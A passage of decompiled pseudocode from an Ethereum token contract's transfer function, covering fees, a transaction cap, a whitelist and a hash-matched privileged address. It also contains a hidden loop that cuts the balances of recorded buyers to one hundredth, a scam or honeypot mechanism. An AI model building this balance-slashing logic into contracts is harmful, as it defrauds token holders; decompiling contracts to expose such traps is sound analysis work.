                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _760 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_760] = 26
                    mem[_760 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 'NH{q', 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7060 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7066 = mem[_7060]
                require mem[_7060] == mem[_7060 + 12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7084 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7090 = mem[_7084]
                require mem[_7084] == mem[_7084 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7090)
                require ext_code.size(address(_7066))
                staticcall address(_7066).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7090)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7108 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7108] == mem[_7108 + 12 len 20]
                if arg1 != mem[_7108 + 12 len 20]:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7162 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7180 = mem[_7162]
                    require mem[_7162] == mem[_7162 + 12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7228 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7258 = mem[_7228]
                    require mem[_7228] == mem[_7228 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7258)
                    require ext_code.size(address(_7180))
                    staticcall address(_7180).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7258)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7412 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7480 = mem[_7412]
                    require mem[_7412] == mem[_7412 + 12 len 20]
                    if mem[_7412 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7846 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7846 + 32 len mem[_7846]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7480):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7874 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7874 + 32 len mem[_7874]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
